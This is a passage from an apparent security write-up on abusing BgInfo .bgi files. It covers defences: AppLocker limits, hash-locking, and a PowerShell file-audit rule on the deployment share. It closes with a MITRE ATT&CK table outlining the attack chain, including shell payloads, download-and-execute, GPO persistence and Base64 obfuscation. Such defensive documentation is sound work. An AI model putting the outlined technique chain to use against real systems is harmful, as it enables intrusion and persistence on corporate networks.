# Note: BgInfo's embedded VBScript runs inside its own process,
#       not as a standalone .vbs — Script Rules won't catch it directly.
#       But chained VBScript files (.vbs dropped to disk) will be caught.
```

**Hash-lock the legitimate .bgi using AppLocker file hash rules:**

```powershell
# If your environment uses a fixed .bgi, create a hash rule that only allows
# the known-good version. Any modification (payload insertion) changes the hash
# and AppLocker blocks execution.
# gpedit.msc → AppLocker → Windows Installer Rules (for data files) is limited;
# focus on alerting via file integrity monitoring (FIM) on the share path instead.
```

**File Integrity Monitoring on .bgi deployment paths:**

```powershell
# Enable auditing on the share directory
$acl = Get-Acl "\\fileserver\it\bginfo"
$audit = New-Object System.Security.AccessControl.FileSystemAuditRule(
    "Everyone", "Write,Delete,CreateFiles", "ContainerInherit,ObjectInherit",
    "None", "Success")
$acl.AddAuditRule($audit)
Set-Acl "\\fileserver\it\bginfo" $acl

# Then alert on Event ID 4663 (file write) for .bgi files in Security log
```

---

## MITRE ATT&CK

| ID | Name |
|----|------|
| [T1218](https://attack.mitre.org/techniques/T1218/) | System Binary Proxy Execution |
| [T1059.005](https://attack.mitre.org/techniques/T1059/005/) | Command and Scripting Interpreter: VBScript |
| [T1059.001](https://attack.mitre.org/techniques/T1059/001/) | Command and Scripting Interpreter: PowerShell (shell payload) |
| [T1105](https://attack.mitre.org/techniques/T1105/) | Ingress Tool Transfer (download-and-execute variant) |
| [T1547.001](https://attack.mitre.org/techniques/T1547/001/) | Boot or Logon Autostart Execution: Registry Run Keys / Startup (GPO persistence) |
| [T1078](https://attack.mitre.org/techniques/T1078/) | Valid Accounts (share write access via current user context) |
| [T1027](https://attack.mitre.org/techniques/T1027/) | Obfuscated Files or Information (Base64-encoded PS payload) |
